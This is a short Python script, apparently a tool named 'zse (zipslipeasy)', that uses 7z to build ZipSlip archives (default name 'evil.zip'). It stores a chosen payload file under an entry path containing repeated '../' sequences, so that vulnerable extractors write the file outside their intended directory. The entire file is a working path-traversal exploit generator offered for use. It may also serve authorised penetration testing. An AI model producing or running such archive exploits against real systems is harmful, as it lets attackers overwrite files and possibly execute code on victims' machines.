import os
import shutil
import subprocess
from pathlib import Path
import argparse

def build_zip_slip(payload_file, depth, output_zip, target_subdir="the/target/dir", verbose=True):
    temp_root = Path("zse_temp")
    
    # Create a nested directory structure with the specified depth
    nested_path = os.path.join(*[str(i+1) for i in range(depth)])
    nested_dir = temp_root / nested_path
    
    target_dir = temp_root / target_subdir
    payload_name = Path(payload_file).name
    payload_target_path = target_dir / payload_name
    
    # Clean temp dir
    if temp_root.exists():
        shutil.rmtree(temp_root)
    
    # Recreate structure
    target_dir.mkdir(parents=True, exist_ok=True)
    shutil.copy(payload_file, payload_target_path)
    nested_dir.mkdir(parents=True, exist_ok=True)
    
    # Build traversal path based on the depth
    traversal_path = ("../" * depth) + f"{target_subdir}/{payload_name}"
    
    # Change into the nested dir to zip with traversal path
    original_dir = os.getcwd()
    os.chdir(nested_dir)
    
    # Calculate the correct path back to the output zip
    back_to_root = "../" * depth
    output_zip_path = back_to_root + output_zip
    
    # Create the zip with the traversal path
    try:
        # Handle subprocess output based on verbose flag
        stdout = None if verbose else subprocess.DEVNULL
        stderr = None if verbose else subprocess.DEVNULL
        
        subprocess.run([
            "7z", "a", "-spf", output_zip_path, traversal_path
        ], check=True, stdout=stdout, stderr=stderr)
        
        print(f"[+] ZipSlip archive created: {output_zip}")
        
        if verbose:
            subprocess.run(["7z", "l", output_zip_path], stdout=stdout, stderr=stderr)
    finally:
        # Make sure we return to the original directory
        os.chdir(original_dir)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="zse (zipslipeasy) | a tool by @ph5i", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("payload", help="path to payload file")
    parser.add_argument("-d", "--depth", type=int, default=3, help="how many directories to traverse up")
    parser.add_argument("-t", "--target", default="the/target/dir", help="target directory path")
    parser.add_argument("-o", "--output", default="evil.zip", help="output zip filename")
    parser.add_argument("-v", "--verbose", action="store_false", dest="verbose", 
                        help="include 7z output")
    parser.set_defaults(verbose=True)
    args = parser.parse_args()
    
    build_zip_slip(args.payload, args.depth, args.output, args.target, args.verbose)